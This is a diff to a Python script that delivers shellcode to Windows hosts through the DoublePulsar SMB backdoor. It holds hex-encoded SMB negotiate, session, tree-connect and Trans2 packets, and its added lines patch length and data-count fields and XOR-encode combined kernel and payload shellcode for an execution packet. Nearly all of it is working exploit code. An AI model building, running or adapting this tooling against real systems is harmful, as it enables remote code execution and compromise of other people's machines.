@@ -2,6 +2,7 @@
 
 import binascii
 import socket
+import struct
 
 def hexdump(src, length=16, sep='.'):
     """Hex dump bytes to ASCII string, padded neatly
@@ -117,14 +118,10 @@ def byte_xor(data, key):
 if __name__ == "__main__":
 
     # Packets
-    negotiate_protocol_request = binascii.unhexlify(
-        "00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
-    session_setup_request = binascii.unhexlify(
-        "00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
-    tree_connect_request = binascii.unhexlify(
-        "00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
-    trans2_session_setup = binascii.unhexlify(
-        "0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")
+    negotiate_protocol_request = binascii.unhexlify("00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
+    session_setup_request = binascii.unhexlify("00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
+    tree_connect_request = binascii.unhexlify("00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
+    trans2_session_setup = binascii.unhexlify("0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")
 
     timeout = 5.0
     # sample IP
@@ -206,11 +203,17 @@ if __name__ == "__main__":
         # add PAYLOAD shellcode length after the kernel shellcode and write this value in hex
         payload_shellcode_size = len(payload_shellcode)
 
-        value = struct.pack('<H', payload_shellcode_size)
-        modified_kernel_shellcode += value
+        payload_shellcode_size_in_hex = struct.pack('<H', payload_shellcode_size)
+        modified_kernel_shellcode += payload_shellcode_size_in_hex
         modified_kernel_shellcode += bytes_payload_shellcode
+        
+        shellcode_payload_size = len(modified_kernel_shellcode)
+        print("Total size of shellcode:  %d" % shellcode_payload_size)
 
-        final_length = len(modified_kernel_shellcode)
+        #commenting out the padding to 4096 bytes until this can be confirmed to work
+        #not a good idea to use NOPS either
+        '''
+        shellcode_payload_size = len(modified_kernel_shellcode)
         print("Total size of shellcode before padding:  %d" % final_length)
         padded_bytes = 4096 - final_length
 
@@ -219,15 +222,56 @@ if __name__ == "__main__":
         modified_kernel_shellcode += bytes_filler_bytes
         buffer_len = len(modified_kernel_shellcode)
         print("Total size of shellcode after padding:  %d" % buffer_len)
-
+        '''
+        
         #xor the payload data now
         byte_xor(modified_kernel_shellcode, packed_xor_key)
         
         #build the execution packet
         trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
         doublepulsar_exec_packet = bytearray(trans2_exec_packet)
+        
+        trans2_packet_len = len(doublepulsar_exec_packet)
+        print("Total size of SMB packet:  %d" % trans2_packet_len)
+        
+        packet_len = trans2_packet_len + shellcode_payload_size
+        print("Total size of SMB packet & shellcode:  %d" % packet_len)
+        
+        print("we take out 4 from the total size because the NetBIOS length is not counted in the SMB Packet")
+        print("Example: A full packet wil be 4178 bytes in length.  4096 bytes for shellcode, 70 for the SMB doublepulsar packet, 12 for the parameters")
+        print("but the NetBIOS header will say 4174 because the 4 bytes in the NetBIOS header doesn't count")
 
-        #update values
+        merged_packet_len = trans2_packet_len + shellcode_payload_size - 4
+        print("Total size of SMB packet & shellcode:  %d" % merged_packet_len)
+
+        print("Updating SMB length value...")
+        #SMB length requires a big endian format -> Python Struct '>H' equals big endian unsigned short
+        smb_length = struct.pack('>H', merged_packet_len)
+        doublepulsar_exec_packet[2] = smb_length[0]
+        doublepulsar_exec_packet[3] = smb_length[1]
+        
+        #<I = Little Endian unsigned integer
+        TotalDataCount = struct.pack('<I', shellcode_payload_size)
+        DataCount = struct.pack('<I', shellcode_payload_size)
+        ByteCount = struct.pack('<I', shellcode_payload_size+13)
+        
+        '''
+        not sure why we add 13 here
+        and not 12 but it's because of the parameters but it's in the Doublepulsar 
+        examples so we'll just copy that
+        '''
+        
+        #update TotalDataCount in the packet ( default in the packet is 4096 )
+        doublepulsar_exec_packet[39] = TotalDataCount[0]
+        doublepulsar_exec_packet[40] = TotalDataCount[1]
+        #update DataCount in the packet ( default in the packet is 4096 )
+        doublepulsar_exec_packet[59] = DataCount[0]
+        doublepulsar_exec_packet[60] = DataCount[1]
+        #update ByteCount in the packet ( default in the packet is 4109 )
+        doublepulsar_exec_packet[67] = ByteCount[0]
+        doublepulsar_exec_packet[68] = ByteCount[1]
+    
+        #update values for tree ID and user ID
         doublepulsar_exec_packet[28] = tree_id[0]
         doublepulsar_exec_packet[29] = tree_id[1]
         doublepulsar_exec_packet[32] = user_id[0]
